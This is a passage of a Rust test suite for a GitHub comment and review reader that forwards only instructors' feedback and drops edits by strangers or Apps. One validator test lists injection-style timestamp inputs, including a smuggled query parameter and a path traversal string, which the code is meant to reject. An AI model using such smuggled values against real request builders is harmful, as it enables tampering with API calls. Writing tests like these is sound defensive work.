            &[e(EDIT_AT, "tom"), create],
            2,
            "IC_7"
        )));
    }

    #[test]
    fn a_comment_whose_last_editor_is_not_an_instructor_is_dropped_however_the_history_reads() {
        let create = e(CREATED, "tom");
        for who in [Who::User("stranger"), NOBODY] {
            let last = e(EDIT_AT, who);
            let cases: [&[Edit]; 4] = [
                &[],
                &[e(EDIT_AT, "tom"), create],
                &[e(EDIT_AT, "amy"), create],
                &[e(EDIT_AT, who), create],
            ];
            for nodes in cases {
                assert!(
                    !kept_after(&editor_reply_raw(Some(last), nodes, nodes.len(), "IC_7")),
                    "{}",
                    editor_reply_raw(Some(last), nodes, nodes.len(), "IC_7")
                );
            }
        }
    }

    #[test]
    fn a_comment_that_cannot_be_looked_up_or_is_gone_is_dropped_and_not_reported() {
        // No node id, and no `updated_at`: nothing to look up, so no call.
        let mut no_id = edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "x");
        no_id["node_id"] = Value::Null;
        let mut no_update = rest_node(8, Some("tom"), WRITTEN, "y");
        no_update["updated_at"] = Value::Null;
        no_update["node_id"] = Value::Null;
        let fake = answering(&[
            rest_reply(&[no_id, no_update]),
            activity_body_reply("b", None),
        ]);
        let activity = activity_of(&fake, &["tom"]);
        assert_eq!(activity.comments, vec![]);
        assert_eq!(activity.dropped, vec![]);
        assert_eq!(fake.calls(), vec![comments_call(), body_edit_call()]);

        // The lookup answers `null` for a comment that is gone.
        let gone = answering(&[
            rest_reply(&[edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "x")]),
            r#"{"data":{"nodes":[null]}}"#.into(),
            activity_body_reply("b", None),
        ]);
        let gone_activity = activity_of(&gone, &["tom"]);
        assert_eq!(gone_activity.comments, vec![]);
        assert_eq!(gone_activity.dropped, vec![]);
    }

    #[test]
    fn only_edited_comments_by_instructors_are_looked_up_in_one_call_oldest_first() {
        let fake = answering(&[
            rest_reply(&[
                edited_rest_node(9, "tom", "2026-10-04T10:03:00Z", EDIT_AT, "c"),
                edited_rest_node(8, "stranger", "2026-10-04T10:02:00Z", EDIT_AT, "not ours"),
                edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "a"),
                rest_node(5, Some("stranger"), "2026-10-04T10:04:00Z", "plain"),
            ]),
            // GitHub promises no order for the nodes.
            editors_reply(&[
                editor_reply_for(Some(e(EDIT_AT, "stranger")), "IC_9"),
                editor_reply(Some(e(EDIT_AT, "tom"))),
            ]),
            activity_body_reply("b", None),
        ]);
        let activity = activity_of(&fake, &["tom"]);
        assert_eq!(ids_of(&activity), vec!["7"]);
        assert_eq!(
            activity.dropped,
            vec![drop_of("9", DropReason::EditedByOther)]
        );
        assert_eq!(
            fake.calls(),
            vec![
                comments_call(),
                editor_call(&ids(&["IC_7", "IC_9"])),
                body_edit_call()
            ]
        );
    }

    #[test]
    fn edited_comments_are_looked_up_100_to_a_call() {
        let numbers: Vec<u64> = (0..101).map(|i| 1000 + i).collect();
        let at = |i: usize| format!("2026-10-04T10:{}:{}Z", pad(i / 60), pad(i % 60));
        let answer = |some: &[u64]| {
            editors_reply(
                &some
                    .iter()
                    .map(|id| editor_reply_for(Some(e(EDIT_AT, "tom")), &format!("IC_{id}")))
                    .collect::<Vec<_>>(),
            )
        };
        let nodes: Vec<Value> = numbers
            .iter()
            .enumerate()
            .map(|(i, id)| edited_rest_node(*id, "tom", &at(i + 1), EDIT_AT, "x"))
            .collect();
        let fake = answering(&[
            rest_reply(&nodes),
            answer(&numbers[..100]),
            answer(&numbers[100..]),
            activity_body_reply("b", None),
        ]);
        let activity = activity_of(&fake, &["tom"]);
        assert_eq!(activity.comments.len(), 101);
        let node_ids: Vec<String> = numbers.iter().map(|id| format!("IC_{id}")).collect();
        assert_eq!(
            fake.calls(),
            vec![
                comments_call(),
                editor_call(&node_ids[..100]),
                editor_call(&node_ids[100..]),
                body_edit_call()
            ]
        );
    }

    #[test]
    fn dropped_comments_are_listed_oldest_first_beside_the_forwardable_ones_and_the_body_edit_is_left_alone()
     {
        let fake = answering(&[
            rest_reply(&[
                edited_rest_node(9, "tom", "2026-10-04T10:03:00Z", EDIT_AT, "c"),
                rest_node(8, Some("tom"), "2026-10-04T10:02:00Z", "kept"),
                edited_rest_node(7, "tom", "2026-10-04T10:01:00Z", EDIT_AT, "a"),
            ]),
            editors_reply(&[
                editor_reply(Some(e(EDIT_AT, "stranger"))),
                editor_reply_raw(Some(e(EDIT_AT, "tom")), &[], 0, "IC_9"),
            ]),
            activity_body_reply("new body", Some(e(EDIT_AT, "tom"))),
        ]);
        let activity = activity_of(&fake, &["tom"]);
        assert_eq!(ids_of(&activity), vec!["8"]);
        assert_eq!(
            activity.dropped,
            vec![
                drop_of("7", DropReason::EditedByOther),
                drop_of("9", DropReason::Unverifiable)
            ]
        );
        assert_eq!(
            activity.body_edit.map(|edit| edit.body).as_deref(),
            Some("new body")
        );
    }

    #[test]
    fn a_failing_or_unreadable_editor_lookup_is_an_error() {
        let list = rest_reply(&[edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "x")]);
        let failing = FakeTracker::answering([Answer::ok(list.as_str()), Answer::fail(1, "boom")]);
        let error = activity_error(&failing, &["tom"]);
        assert_eq!(
            error,
            TrackerError::Other {
                kind: OtherKind::Failed,
                message: format!(
                    "`{}` exited with status 1: boom",
                    command_text(&editor_call(&ids(&["IC_7"])))
                )
            }
        );
        let old_shape = r#"{"data":{"nodes":[{"id":"IC_7","lastEditedAt":"2026-10-04T10:20:00Z","editor":{"login":"tom"}}]}}"#;
        let no_total = r#"{"data":{"nodes":[{"id":"IC_7","lastEditedAt":null,"editor":null,"userContentEdits":{"nodes":[]}}]}}"#;
        for bad in [
            old_shape,
            no_total,
            "nope",
            r#"{"errors":[{"message":"x"}]}"#,
        ] {
            let fake = answering(&[list.clone(), bad.into()]);
            let parse = activity_error(&fake, &["tom"]);
            assert!(
                is_parse_error_of(Some(parse), &editor_call(&ids(&["IC_7"]))),
                "{bad}"
            );
        }
    }

    #[test]
    fn a_body_edit_by_an_instructor_after_since_is_the_activitys_body_edit() {
        let fake = answering(&[
            "[]".into(),
            activity_body_reply("new body", Some(e("2026-10-04T10:30:00Z", "Tom"))),
        ]);
        assert_eq!(
            activity_of(&fake, &["tom"]).body_edit,
            Some(BodyEdit {
                edited_at: "2026-10-04T10:30:00Z".into(),
                editor: "Tom".into(),
                body: "new body".into(),
            })
        );
    }

    #[test]
    fn no_body_edit_when_its_editor_is_not_an_instructor_it_was_never_edited_or_it_is_not_after_since()
     {
        let body_edit_of =
            |reply: String| activity_of(&answering(&["[]".into(), reply]), &["tom"]).body_edit;
        assert_eq!(
            body_edit_of(activity_body_reply(
                "b",
                Some(e("2026-10-04T10:30:00Z", "stranger"))
            )),
            None
        );
        assert_eq!(body_edit_of(activity_body_reply("b", None)), None);
        assert_eq!(
            body_edit_of(activity_body_reply(
                "b",
                Some(e("2026-10-04T09:30:00Z", "tom"))
            )),
            None
        );
        assert_eq!(
            body_edit_of(activity_body_reply("b", Some(e(ACT_SINCE, "tom")))),
            None
        );
    }

    #[test]
    fn a_strangers_edit_after_since_keeps_the_body_from_being_forwarded_whoever_edited_last() {
        // The body shown is the whole current body: a stranger's edit followed by an
        // instructor's typo fix would carry the stranger's text under the instructor's name.
        let last = e("2026-10-04T10:40:00Z", "tom");
        let history = [
            e(CREATED, "tom"),
            e("2026-10-04T10:30:00Z", "stranger"),
            last,
        ];
        let fake = answering(&[
            "[]".into(),
            body_reply_raw("b", Some(last), &newest_first(&history), 3),
        ]);
        assert_eq!(activity_of(&fake, &["tom"]).body_edit, None);
        // An edit before since by a stranger does not matter.
        let early = [e(CREATED, "stranger"), e("2026-10-04T10:30:00Z", "tom")];
        let fine = answering(&[
            "[]".into(),
            body_reply_raw(
                "b",
                Some(e("2026-10-04T10:30:00Z", "tom")),
                &newest_first(&early),
                2,
            ),
        ]);
        assert_eq!(
            activity_of(&fine, &["tom"])
                .body_edit
                .map(|edit| edit.edited_at)
                .as_deref(),
            Some("2026-10-04T10:30:00Z")
        );
    }

    #[test]
    fn a_strangers_edit_in_the_same_second_as_since_keeps_the_body_from_being_forwarded() {
        // Timestamps have no finer order than the second, so a stranger's edit in the second of
        // `since` may have come after the last read: fail closed, as `text_changes_since` does.
        let body_edit_with_stranger_at = |at: &str| {
            let last = e("2026-10-04T10:05:00Z", "tom");
            let history = [e(CREATED, "tom"), e(at, "stranger"), last];
            let fake = answering(&[
                "[]".into(),
                body_reply_raw("b", Some(last), &newest_first(&history), 3),
            ]);
            activity_of(&fake, &["tom"]).body_edit
        };
        assert_eq!(body_edit_with_stranger_at(ACT_SINCE), None);
        assert_eq!(
            body_edit_with_stranger_at("2026-10-04T09:59:59Z")
                .map(|edit| edit.edited_at)
                .as_deref(),
            Some("2026-10-04T10:05:00Z")
        );
    }

    #[test]
    fn a_body_edit_by_an_app_with_an_instructors_login_is_not_forwarded() {
        let app = bot("tom");
        let at = "2026-10-04T10:30:00Z";
        // The last editor is the App.
        let last_bot = e(at, app);
        let a = answering(&[
            "[]".into(),
            body_reply_raw(
                "b",
                Some(last_bot),
                &newest_first(&[e(CREATED, "tom"), last_bot]),
                2,
            ),
        ]);
        assert_eq!(activity_of(&a, &["tom"]).body_edit, None);
        // The last editor is the person, but the App edited in between: the whole body is shown.
        let last = e("2026-10-04T10:40:00Z", "tom");
        let history = [e(CREATED, "tom"), last_bot, last];
        let b = answering(&[
            "[]".into(),
            body_reply_raw("b", Some(last), &newest_first(&history), 3),
        ]);
        assert_eq!(activity_of(&b, &["tom"]).body_edit, None);
        // An editor that does not say what it is fails closed.
        let bare = body_reply_raw(
            "b",
            Some(e(at, "tom")),
            &newest_first(&[e(CREATED, "tom"), e(at, "tom")]),
            2,
        )
        .replace(r#""__typename":"User","#, "");
        let c = answering(&["[]".into(), bare]);
        assert_eq!(activity_of(&c, &["tom"]).body_edit, None);
        // The guard on the last editor alone: an App last editor, a history that looks like the
        // person's.
        let guard = answering(&[
            "[]".into(),
            body_reply_raw(
                "b",
                Some(e(at, app)),
                &newest_first(&[e(CREATED, "tom"), e(at, "tom")]),
                2,
            ),
        ]);
        assert_eq!(activity_of(&guard, &["tom"]).body_edit, None);
        // The person alone is still forwarded.
        let d = answering(&["[]".into(), activity_body_reply("b", Some(e(at, "tom")))]);
        assert_eq!(
            activity_of(&d, &["tom"])
                .body_edit
                .map(|edit| edit.edited_at)
                .as_deref(),
            Some(at)
        );
    }

    #[test]
    fn a_comment_edited_by_an_app_with_an_instructors_login_is_dropped_once() {
        let app = bot("tom");
        assert_eq!(
            dropped_after(&editor_reply(Some(e(EDIT_AT, app)))),
            vec![drop_of("7", DropReason::EditedByOther)]
        );
        // The person edited last, but the App edited in between.
        let last = e("2026-10-04T10:25:00Z", "tom");
        let history = [e(CREATED, "tom"), e(EDIT_AT, app), last];
        assert_eq!(
            dropped_after(&editor_reply_history(Some(last), &history)),
            vec![drop_of("7", DropReason::EditedByOther)]
        );
        // The App edited last and the history is cut off: the last editor decides, not the
        // cut-off.
        let cut = [e(EDIT_AT, "tom"), e(CREATED, "tom")];
        assert_eq!(
            dropped_after(&editor_reply_raw(Some(e(EDIT_AT, app)), &cut, 5, "IC_7")),
            vec![drop_of("7", DropReason::EditedByOther)]
        );
    }

    #[test]
    fn a_body_edit_history_that_may_be_cut_off_or_whose_newest_entry_is_not_the_latest_edit_is_not_forwarded()
     {
        let last = e("2026-10-04T10:05:00Z", "tom");
        let body_edit =
            |reply: String| activity_of(&answering(&["[]".into(), reply]), &["tom"]).body_edit;
        // A total one above the page: one edit is hidden.
        let nodes = [last, e(CREATED, "tom")];
        assert!(body_edit(body_reply_raw("b", Some(last), &nodes, 2)).is_some());
        assert!(body_edit(body_reply_raw("b", Some(last), &nodes, 3)).is_none());
        // A full page, even when only its newest entry is after since.
        let older: Vec<String> = (0..99)
            .map(|i| format!("2026-10-04T09:{}:{}Z", pad(i / 60), pad(i % 60)))
            .collect();
        let mut page = vec![last];
        page.extend(older.iter().rev().map(|t| e(t, "tom")));
        assert_eq!(page.len(), 100);
        assert!(body_edit(body_reply_raw("b", Some(last), &page, 100)).is_none());
        assert!(body_edit(body_reply_raw("b", Some(last), &page[..99], 99)).is_some());
        // The newest entry is not the latest edit.
        assert!(
            body_edit(body_reply_raw(
                "b",
                Some(last),
                &[e("2026-10-04T10:04:00Z", "tom"), e(CREATED, "tom")],
                2
            ))
            .is_none()
        );
        assert!(body_edit(body_reply_raw("b", Some(last), &[], 0)).is_none());
    }

    #[test]
    fn activity_errors_name_the_call_that_failed_and_a_failed_comments_call_makes_no_second() {
        let comments = FakeTracker::answering([Answer::fail(1, "Not Found")]);
        let failed = activity_error(&comments, &["tom"]);
        assert_eq!(
            failed,
            TrackerError::Other {
                kind: OtherKind::Failed,
                message: format!(
                    "`{}` exited with status 1: Not Found",
                    command_text(&comments_call())
                )
            }
        );
        assert_eq!(comments.calls().len(), 1);

        let body = FakeTracker::answering([
            Answer::ok("[]"),
            Answer::fail(1, "Could not resolve to an Issue"),
        ]);
        let body_failed = activity_error(&body, &["tom"]);
        assert_eq!(
            body_failed,
            TrackerError::Other {
                kind: OtherKind::Failed,
                message: format!(
                    "`{}` exited with status 1: Could not resolve to an Issue",
                    command_text(&body_edit_call())
                )
            }
        );

        for bad in [
            "nope",
            r#"{"data":{"repository":null}}"#,
            r#"{"errors":[{"message":"x"}]}"#,
        ] {
            let fake = answering(&["[]".into(), bad.into()]);
            let error = activity_error(&fake, &["tom"]);
            assert!(is_parse_error_of(Some(error), &body_edit_call()), "{bad}");
        }

        let not_json = answering(&["not json".into()]);
        let parse = activity_error(&not_json, &["tom"]);
        assert!(is_parse_error_of(Some(parse), &comments_call()));

        let spawn = FakeTracker::answering([Answer::NotStarted("no such file".into())]);
        assert_eq!(
            activity_error(&spawn, &["tom"]),
            TrackerError::Other {
                kind: OtherKind::NotStarted,
                message: format!(
                    "cannot start `{}`: no such file",
                    command_text(&comments_call())
                )
            }
        );
    }

    #[test]
    fn activity_with_a_malformed_repo_is_a_parse_error_without_calling_gh() {
        let fake = FakeTracker::new();
        let error = fake
            .activity_since("no-slash", 6, ACT_SINCE, &names(&["tom"]))
            .unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other { kind: OtherKind::Parse, message: m } if m.contains("returned unexpected output"))
        );
        assert!(fake.calls().is_empty());
    }

    #[test]
    fn activity_with_a_malformed_since_is_a_parse_error_without_calling_gh() {
        for bad in [
            "",
            "yesterday",
            "2026-10-04",
            "2026-10-04T10:00:00",
            "2026-10-04T10:00:00+10:00",
            "2026-10-04 10:00:00Z",
            "2026-10-04T10:00:00.000Z",
            "2026-10-04T10:00:00Z&per_page=1",
            "2026-10-04T10:00:00Z/../../x",
            "2026-10-04T10:00:00Z\n",
            "2026-1O-04T10:00:00Z",
            " 2026-10-04T10:00:00Z",
            "２０２６-10-04T10:00:00Z",
        ] {
            let fake = FakeTracker::new();
            let error = fake
                .activity_since(REPO, 6, bad, &names(&["tom"]))
                .unwrap_err();
            assert!(
                matches!(&error, TrackerError::Other { kind: OtherKind::Parse, message: m } if m.contains("returned unexpected output")),
                "{bad:?}"
            );
            assert!(fake.calls().is_empty(), "{bad:?}");
        }
    }

    // ---- pr_feedback ----

    /// The moment the feedback tests read from: everything after it is new.
    const FB_SINCE: &str = "2026-10-04T10:30:00Z";

    fn person(login: &str) -> Value {
        json!({"__typename": "User", "login": login})
    }

    fn feedback_call(query: &str, rest: &[&str]) -> Vec<String> {
        let mut call = args(&[
            "api",
            "graphql",
            "-f",
            &format!("query={query}"),
            "-f",
            "owner=rawphp",
            "-f",
            "name=softfac",
            "-F",
            "number=6",
        ]);
        call.extend(rest.iter().map(|part| part.to_string()));
        call
    }

    fn before_call(cursor: &str) -> Vec<String> {
        feedback_call(REVIEWS_BEFORE_QUERY, &["-f", &format!("before={cursor}")])
    }

    fn feedback_reply(reviews: &[Value], comments: &[Value]) -> String {
        json!({"data": {"repository": {"pullRequest": {
            "reviews": {"nodes": reviews},
            "comments": {"nodes": comments},
        }}}})
        .to_string()
    }

    /// A reply whose reviews connection says how many there are in all and where its first node
    /// starts.
    fn paged_reply(reviews: &[Value], comments: &[Value], total: u64, cursor: &str) -> String {
        json!({"data": {"repository": {"pullRequest": {
            "reviews": {"totalCount": total, "pageInfo": {"startCursor": cursor}, "nodes": reviews},
            "comments": {"nodes": comments},
        }}}})
        .to_string()
    }

    /// A reply to the paging query.
    fn reviews_page(reviews: &[Value], total: u64, cursor: &str) -> String {
        json!({"data": {"repository": {"pullRequest": {
            "reviews": {"totalCount": total, "pageInfo": {"startCursor": cursor}, "nodes": reviews},
        }}}})
        .to_string()
    }

    fn comments_before_call(cursor: &str) -> Vec<String> {
        feedback_call(COMMENTS_BEFORE_QUERY, &["-f", &format!("before={cursor}")])
    }

    /// A reply with no reviews whose conversation comments say how many there are in all and
    /// where the first one starts.
    fn comments_paged_reply(comments: &[Value], total: u64, cursor: Option<&str>) -> String {
        json!({"data": {"repository": {"pullRequest": {
            "reviews": {"nodes": []},
            "comments": {"totalCount": total, "pageInfo": {"startCursor": cursor}, "nodes": comments},
        }}}})
        .to_string()
    }

    /// A reply to the conversation comments' paging query.
    fn comments_page(comments: &[Value], total: u64, cursor: &str) -> String {
        json!({"data": {"repository": {"pullRequest": {
            "comments": {"totalCount": total, "pageInfo": {"startCursor": cursor}, "nodes": comments},
        }}}})
        .to_string()
    }

    /// A full page of conversation comments by a stranger, all after [`FB_SINCE`].
    fn hundred_new_comments() -> Vec<Value> {
        (0..100)
            .map(|i| pr_comment_node(1000 + i, "noise", "2026-10-04T11:00:00Z", "stranger"))
            .collect()
    }

    const GONE: &str = r#"{"data":{"repository":{"pullRequest":null}}}"#;

    fn review_node(
        id: impl ToString,
        state: &str,
        body: &str,
        at: Option<&str>,
        author: &str,
        inline: &[Value],
    ) -> Value {
        json!({
            "fullDatabaseId": id.to_string(),
            "state": state,
            "body": body,
            "submittedAt": at,
            "author": person(author),
            "lastEditedAt": null,
            "editor": null,
            "comments": {"nodes": inline},
        })
    }

    fn inline_node_at(
        body: &str,
        path: &str,
        line: Option<u64>,
        author: &str,
        original_line: Option<u64>,
    ) -> Value {
        json!({
            "body": body,
            "path": path,
            "line": line,
            "originalLine": original_line,
            "author": person(author),
        })
    }

    fn inline_node(body: &str, path: &str, line: u64, author: &str) -> Value {
        inline_node_at(body, path, Some(line), author, Some(5))
    }

    fn pr_comment_node(id: impl ToString, body: &str, at: &str, author: &str) -> Value {
        json!({
            "fullDatabaseId": id.to_string(),
            "body": body,
            "createdAt": at,
            "author": person(author),
            "lastEditedAt": null,
            "editor": null,
        })
    }

    fn read_with(fake: &FakeTracker, since: &str, floor: &str) -> Vec<Feedback> {
        fake.pr_feedback(REPO, 6, since, floor, &names(&["rawphp"]))
            .unwrap()
    }

    fn read(fake: &FakeTracker) -> Vec<Feedback> {
        read_with(fake, FB_SINCE, FB_SINCE)
    }

    fn error_with(fake: &FakeTracker, since: &str, floor: &str) -> TrackerError {
        fake.pr_feedback(REPO, 6, since, floor, &names(&["rawphp"]))
            .unwrap_err()
    }

    fn feedback_error(fake: &FakeTracker) -> TrackerError {
        error_with(fake, FB_SINCE, FB_SINCE)
    }

    fn read_feedback(answer: &str) -> Vec<Feedback> {
        read(&FakeTracker::answering([Answer::ok(answer)]))
    }

    fn feedback_ids(items: &[Feedback]) -> Vec<&str> {
        items.iter().map(|f| f.id.as_str()).collect()
    }

    #[test]
    fn pr_feedback_asks_for_the_reviews_and_conversation_comments_with_one_call() {
        let fake = FakeTracker::answering([Answer::ok(feedback_reply(&[], &[]))]);
        read(&fake);
        assert_eq!(fake.calls(), vec![feedback_call(PR_FEEDBACK_QUERY, &[])]);
    }

    #[test]
    fn pr_feedback_reads_a_real_answer_to_the_feedback_query_by_the_rules() {
        let live = include_str!("fixtures/pr_feedback_cli_9000.json");
        let fake = FakeTracker::answering([Answer::ok(live)]);
        let items = fake
            .pr_feedback(
                REPO,
                9000,
                "2024-04-01T00:00:00Z",
                "2024-04-01T00:00:00Z",
                &names(&["williammartin"]),
            )
            .unwrap();
        // Review 2028948315 approves with a body that ends in "LGTM!" and no inline comment, so
        // it is not feedback.
        assert_eq!(
            feedback_ids(&items),
            vec!["pr-comment:2082274688", "review:2028628010"]
        );
        assert_eq!(
            items[1].kind,
            FeedbackKind::Review {
                state: "COMMENTED".into()
            }
        );
        let inline: Vec<(&str, Option<u64>)> = items[1]
            .inline
            .iter()
            .map(|c| (c.path.as_str(), c.line))
            .collect();
        assert_eq!(
            inline,
            vec![
                ("pkg/cmd/attestation/verify/verify.go", Some(130)),
                ("pkg/cmdutil/auth_check_test.go", Some(113))
            ]
        );
        // Someone else's review and comments are not feedback.
        assert!(items.iter().all(|i| i.author == "williammartin"));
    }

    #[test]
    fn the_feedback_query_asks_for_what_the_rules_judge() {
        for part in [
            "pullRequest(number: $number)",
            "reviews(last: 50) { totalCount pageInfo { startCursor } nodes {",
            "comments(last: 100)",
            "comments(first: 50)",
            "fullDatabaseId",
            "submittedAt",
            "lastEditedAt",
            "editor { __typename login }",
            "author { __typename login }",
            "originalLine",
            "comments(first: 50) { totalCount nodes { id body path line originalLine",
            "userContentEdits(first: 20)",
            "totalCount nodes { editedAt editor { __typename login } }",
        ] {
            assert!(PR_FEEDBACK_QUERY.contains(part), "missing {part}");
        }
        // The review's and the conversation comment's histories, and no history on the inline
        // comments: those are read one comment at a time, only where one was edited.
        assert_eq!(
            PR_FEEDBACK_QUERY
                .matches("userContentEdits(first: 20)")
                .count(),
            2
        );
        assert!(!PR_FEEDBACK_QUERY.contains("reviews(last: 100)"));
        assert!(!PR_FEEDBACK_QUERY.contains("comments(first: 100)"));
    }

    #[test]
    fn the_feedback_queries_are_softfacs_with_a_count_and_a_cursor_on_the_conversation_comments() {
        // softfac reads only the newest 100 conversation comments; this port also asks for the
        // count and the cursor, to page back as it does for reviews.
        let softfac = "query($owner: String!, $name: String!, $number: Int!) { repository(owner: $owner, name: $name) { pullRequest(number: $number) { reviews(last: 50) { totalCount pageInfo { startCursor } nodes { fullDatabaseId state body submittedAt author { __typename login } lastEditedAt editor { __typename login } userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } comments(first: 50) { totalCount nodes { id body path line originalLine author { __typename login } lastEditedAt } } } } comments(last: 100) { nodes { fullDatabaseId body createdAt author { __typename login } lastEditedAt editor { __typename login } userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } } } } } }";
        assert_eq!(
            PR_FEEDBACK_QUERY,
            softfac.replace(
                "comments(last: 100) { nodes {",
                "comments(last: 100) { totalCount pageInfo { startCursor } nodes {"
            )
        );
        assert_eq!(
            REVIEWS_BEFORE_QUERY,
            "query($owner: String!, $name: String!, $number: Int!, $before: String!) { repository(owner: $owner, name: $name) { pullRequest(number: $number) { reviews(last: 50, before: $before) { totalCount pageInfo { startCursor } nodes { fullDatabaseId state body submittedAt author { __typename login } lastEditedAt editor { __typename login } userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } comments(first: 50) { totalCount nodes { id body path line originalLine author { __typename login } lastEditedAt } } } } } } }"
        );
    }

    /// The text of the `{ ... }` that follows the first `reviews(` in `query`.
    fn reviews_selection(query: &str) -> &str {
        selection_after(query, "reviews(")
    }

    /// The text of the `{ ... }` that follows the first `start` in `query`.
    fn selection_after<'a>(query: &'a str, start: &str) -> &'a str {
        let from = query.find(start).unwrap();
        let open = from + query[from..].find('{').unwrap();
        let mut depth = 0;
        for (at, c) in query[open..].char_indices() {
            match c {
                '{' => depth += 1,
                '}' => {
                    depth -= 1;
                    if depth == 0 {
                        return &query[open..open + at + 1];
                    }
                }
                _ => {}
            }
        }
        panic!("no closing brace after {start} in {query}");
    }

    #[test]
    fn both_feedback_queries_select_the_same_review_fields() {
        let first = reviews_selection(PR_FEEDBACK_QUERY);
        assert!(first.contains("fullDatabaseId"));
        assert_eq!(first, reviews_selection(REVIEWS_BEFORE_QUERY));
    }

    #[test]
    fn both_feedback_queries_select_the_same_conversation_comment_fields() {
        let first = selection_after(PR_FEEDBACK_QUERY, "comments(last: 100");
        assert!(first.contains("fullDatabaseId body createdAt"));
        assert_eq!(
            first,
            selection_after(COMMENTS_BEFORE_QUERY, "comments(last: 100")
        );
    }

    #[test]
    fn the_page_limit_is_twenty_pages_of_fifty_reviews() {
        assert_eq!(REVIEW_PAGE_LIMIT, 20);
        assert!(REVIEWS_BEFORE_QUERY.contains("reviews(last: 50, before: $before)"));
    }

    #[test]
    fn an_instructor_review_is_feedback_with_its_inline_comments_and_their_path_and_line() {
        let inline = inline_node("rename this", "src/a.rs", 7, "rawphp");
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "CHANGES_REQUESTED",
                "please fix",
                Some("2026-10-04T11:00:00Z"),
                "rawphp",
                &[inline],
            )],
            &[],
        ));
        assert_eq!(
            got,
            vec![Feedback {
                id: "review:11".into(),
                author: "rawphp".into(),
                kind: FeedbackKind::Review {
                    state: "CHANGES_REQUESTED".into()
                },
                created_at: "2026-10-04T11:00:00Z".into(),
                body: "please fix".into(),
                inline: vec![InlineComment {
                    path: "src/a.rs".into(),
                    line: Some(7),
                    body: "rename this".into(),
                }],
                inline_unread: 0,
            }]
        );
    }

    #[test]
    fn ids_past_what_a_32_bit_integer_holds_are_read_from_the_full_database_id() {
        let got = read_feedback(&feedback_reply(
            &[review_node(
                6_082_131_994u64,
                "COMMENTED",
                "big",
                Some("2026-10-04T11:00:00Z"),
                "rawphp",
                &[],
            )],
            &[pr_comment_node(
                5_700_000_001u64,
                "also big",
                "2026-10-04T11:01:00Z",
                "rawphp",
            )],
        ));
        assert_eq!(
            feedback_ids(&got),
            vec!["review:6082131994", "pr-comment:5700000001"]
        );
    }

    #[test]
    fn a_full_database_id_that_is_a_json_number_is_read_too() {
        let mut comment = pr_comment_node(21, "hi", "2026-10-04T11:00:00Z", "rawphp");
        comment["fullDatabaseId"] = json!(5_700_000_001u64);
        let got = read_feedback(&feedback_reply(&[], &[comment]));
        assert_eq!(feedback_ids(&got), vec!["pr-comment:5700000001"]);
    }

    #[test]
    fn a_numeric_full_database_id_is_read_up_to_the_largest_exact_json_integer() {
        let mut comment = pr_comment_node(21, "hi", "2026-10-04T11:00:00Z", "rawphp");
        comment["fullDatabaseId"] = json!(9_007_199_254_740_991u64);
        let got = read_feedback(&feedback_reply(&[], &[comment]));
        assert_eq!(feedback_ids(&got), vec!["pr-comment:9007199254740991"]);

        let mut past = pr_comment_node(22, "hi", "2026-10-04T11:00:00Z", "rawphp");
        past["fullDatabaseId"] = json!(9_007_199_254_740_992u64);
        let fake = FakeTracker::answering([Answer::ok(feedback_reply(&[], &[past]))]);
        assert!(is_parse(&feedback_error(&fake)));
    }

    #[test]
    fn a_commented_review_and_a_conversation_comment_are_feedback_oldest_first() {
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "COMMENTED",
                "later",
                Some("2026-10-04T12:00:00Z"),
                "rawphp",
                &[],
            )],
            &[pr_comment_node(
                21,
                "first",
                "2026-10-04T11:00:00Z",
                "rawphp",
            )],
        ));
        let seen: Vec<(&str, &FeedbackKind)> =
            got.iter().map(|f| (f.id.as_str(), &f.kind)).collect();
        assert_eq!(
            seen,
            vec![
                ("pr-comment:21", &FeedbackKind::PrComment),
                (
                    "review:11",
                    &FeedbackKind::Review {
                        state: "COMMENTED".into()
                    }
                ),
            ]
        );
        assert_eq!(got[0].body, "first");
        assert_eq!(got[0].created_at, "2026-10-04T11:00:00Z");
    }

    #[test]
    fn someone_who_is_not_an_instructor_and_a_bot_of_the_same_name_are_not_feedback() {
        let mut bot_comment = pr_comment_node(22, "hi", "2026-10-04T11:00:00Z", "rawphp");
        bot_comment["author"] = json!({"__typename": "Bot", "login": "rawphp"});
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "CHANGES_REQUESTED",
                "no",
                Some("2026-10-04T11:00:00Z"),
                "stranger",
                &[],
            )],
            &[
                pr_comment_node(21, "hello", "2026-10-04T11:00:00Z", "stranger"),
                bot_comment,
            ],
        ));
        assert_eq!(got, vec![]);
    }

    #[test]
    fn an_author_who_was_deleted_is_not_feedback() {
        let mut gone = pr_comment_node(21, "hi", "2026-10-04T11:00:00Z", "rawphp");
        gone["author"] = Value::Null;
        assert_eq!(read_feedback(&feedback_reply(&[], &[gone])), vec![]);
    }

    #[test]
    fn the_logins_are_compared_without_regard_to_case() {
        let got = read_feedback(&feedback_reply(
            &[],
            &[pr_comment_node(
                21,
                "hello",
                "2026-10-04T11:00:00Z",
                "RawPHP",
            )],
        ));
        assert_eq!(got.len(), 1);
    }

    #[test]
    fn a_comment_with_the_factorys_marker_is_never_feedback() {
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "COMMENTED",
                "ok <!-- softfac -->",
                Some("2026-10-04T11:00:00Z"),
                "rawphp",
                &[],
            )],
            &[
                pr_comment_node(
                    21,
                    "gate ok\n\n<!-- softfac -->",
                    "2026-10-04T11:00:00Z",
                    "rawphp",
                ),
                pr_comment_node(
                    22,
                    "<!-- softfac:status -->",
                    "2026-10-04T11:00:00Z",
                    "rawphp",
                ),
            ],
        ));
        assert_eq!(got, vec![]);
    }

    #[test]
    fn a_comment_with_foundrys_marker_is_never_feedback() {
        let marker = "<!-- foundry:claim owner__repo__6__1 mac-1 -->";
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "COMMENTED",
                &format!("ok {marker}"),
                Some("2026-10-04T11:00:00Z"),
                "rawphp",
                &[],
            )],
            &[pr_comment_node(
                21,
                &format!("claimed\n\n{marker}"),
                "2026-10-04T11:00:00Z",
                "rawphp",
            )],
        ));
        assert_eq!(got, vec![]);
